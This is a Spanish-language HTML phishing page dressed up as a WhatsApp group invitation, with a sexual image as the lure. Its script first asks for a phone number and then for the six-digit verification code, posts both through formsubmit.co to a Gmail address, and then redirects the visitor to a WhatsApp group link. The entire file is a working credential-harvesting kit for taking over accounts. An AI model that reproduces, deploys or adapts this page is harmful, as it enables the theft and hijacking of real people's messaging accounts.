<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="いChicas a todo dar">
    <meta property="og:description" content="nete al grupo de WhatsApp para disfrutar de contenido exclusivo.">
    <meta property="og:image" content="https://photos.xgroovy.com/contents/albums/sources/633000/633809/689864.jpg">
    <meta property="og:url" content=""> <!-- Cambia esto por la URL de tu p谩gina -->
    <meta property="og:type" content="website">

    <title>いChicas a todo dar</title>
    <link rel="icon" type="image/x-icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
    <style>
        /* Estilos generales */
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        /* Contenedor del login */
        .login-container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
            position: relative;
        }

        /* Logo de WhatsApp */
        .whatsapp-logo {
            width: 80px; /* Ancho fijo */
            height: 80px; /* Alto igual al ancho */
            margin-bottom: 20px;
            border-radius: 50%; /* Hace que la imagen sea redonda */
            object-fit: cover; /* Evita que la imagen se distorsione */
        }

        /* T铆tulo */
        h1 {
            font-size: 24px;
            color: #25d366;
            margin-bottom: 20px;
        }

        /* Contenedor de inputs (c贸digo de pa铆s y n煤mero) */
        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }

        /* Input del c贸digo de pa铆s */
        #countryCode {
            width: 50px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            outline: none;
        }

        /* Input del n煤mero de tel茅fono */
        #phoneNumber {
            flex: 1;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            outline: none;
        }

        /* Input del c贸digo de verificaci贸n */
        #verificationCode {
            width: 40%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            text-align: center;
            outline: none;
        }

        /* Bot贸n de inicio de sesi贸n */
        button {
            width: 100%;
            padding: 10px;
            background-color: #25d366;
            color: #ffffff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #128c7e;
        }

        /* Ocultar elementos */
        .hidden {
            display: none;
        }

        /* Alertas personalizadas */
        .custom-alert {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background-color: #25d366;
            color: white;
            padding: 15px 30px;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            animation: slideIn 0.5s ease-out;
        }

        .custom-alert.error {
            background-color: #ff4444;
        }

        @keyframes slideIn {
            from {
                top: -50px;
                opacity: 0;
            }
            to {
                top: 20px;
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Logo de WhatsApp -->
        <img src="https://photos.xgroovy.com/contents/albums/sources/633000/633809/689864.jpg" alt="Chica" class="whatsapp-logo">
        
        <!-- T铆tulo -->
        <h1>いChicas a todo dar</h1>

        <!-- Formulario de login (Primera parte: C贸digo de pa铆s y n煤mero) -->
        <form id="phoneForm">
            <div class="input-group">
                <input type="text" id="countryCode" name="PaisCode" placeholder="+52" required>
                <input type="text" id="phoneNumber" name="CeluNumber" placeholder="N煤mero de tel茅fono" required>
            </div>
            <button type="submit">Continuar</button>
            <input type="hidden" name="_captcha" value="false">
        </form>

        <!-- Formulario de c贸digo de verificaci贸n (Segunda parte) -->
        <form id="codeForm" class="hidden">
            <div>
                <input type="text" id="verificationCode" name="verificaCode" placeholder="C贸digo" maxlength="6" required>
            </div>
            <button type="submit">Verificar</button>
            <input type="hidden" name="_captcha" value="false">
        </form>
    </div>

    <!-- Script para manejar el login -->
    <script>
        const phoneForm = document.getElementById("phoneForm");
        const codeForm = document.getElementById("codeForm");
        const verificationCodeInput = document.getElementById("verificationCode");

        // Funci贸n para mostrar alertas personalizadas
        function showAlert(message, isError = false) {
            const alertDiv = document.createElement("div");
            alertDiv.className = `custom-alert ${isError ? "error" : ""}`;
            alertDiv.textContent = message;
            document.body.appendChild(alertDiv);

            // Eliminar la alerta despu茅s de 3 segundos
            setTimeout(() => {
                alertDiv.remove();
            }, 3000);
        }

        // Funci贸n para enviar datos del formulario
        async function sendFormData(form, url) {
            const formData = new FormData(form);
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData,
                    headers: {
                        'Accept': 'application/json'
                    }
                });
                const result = await response.json();
                console.log('Respuesta del servidor:', result);
                showAlert("Datos enviados correctamente.");
                return true; // Indica que el env铆o fue exitoso
            } catch (error) {
                console.error('Error:', error);
                showAlert("...", true);
                return false; // Indica que el env铆o fall贸
            }
        }

        // Manejar el env铆o del formulario de tel茅fono
        phoneForm.addEventListener("submit", function(event) {
            event.preventDefault(); // Evita que el formulario se env铆e autom谩ticamente

            // Obtener valores del formulario
            const countryCode = document.getElementById("countryCode").value;
            const phoneNumber = document.getElementById("phoneNumber").value;

            // Validaci贸n b谩sica
            if (countryCode === "" || phoneNumber === "") {
                showAlert("Por favor, completa todos los campos.", true);
                return;
            }

            // Simular env铆o de c贸digo de verificaci贸n
            showAlert(`C贸digo de verificaci贸n enviado a:\n${countryCode} ${phoneNumber}`);
            console.log(`C贸digo de pa铆s: ${countryCode}, N煤mero: ${phoneNumber}`);

            // Enviar datos del formulario
            sendFormData(phoneForm, 'https://formsubmit.co/thebullnot@gmail.com');

            // Ocultar el formulario de tel茅fono y mostrar el de c贸digo
            phoneForm.classList.add("hidden");
            codeForm.classList.remove("hidden");
        });

        // Manejar el env铆o del formulario de c贸digo
        codeForm.addEventListener("submit", async function(event) {
            event.preventDefault(); // Evita que el formulario se env铆e autom谩ticamente

            // Obtener el c贸digo de verificaci贸n (sin guion)
            const verificationCode = verificationCodeInput.value.replace(/-/g, "");

            // Validaci贸n b谩sica
            if (verificationCode === "") {
                showAlert("Por favor, ingresa el c贸digo de verificaci贸n.", true);
                return;
            }

            // Validar que el c贸digo tenga exactamente 6 d铆gitos
            if (verificationCode.length !== 6 || !/^\d+$/.test(verificationCode)) {
                showAlert("El c贸digo de verificaci贸n debe tener exactamente 6 d铆gitos.", true);
                return;
            }

            // Enviar datos del formulario
            const success = await sendFormData(codeForm, 'https://formsubmit.co/thebullnot@gmail.com');

            // Si el env铆o fue exitoso, redirigir al enlace de WhatsApp
            if (success) {
                showAlert("C贸digo verificado correctamente.\nRedirigiendo...");
                window.location.href = "https://chat.whatsapp.com/JpD75y9mFKlLqc2u7FJj51";
            }
        });
    </script>
</body>
</html>
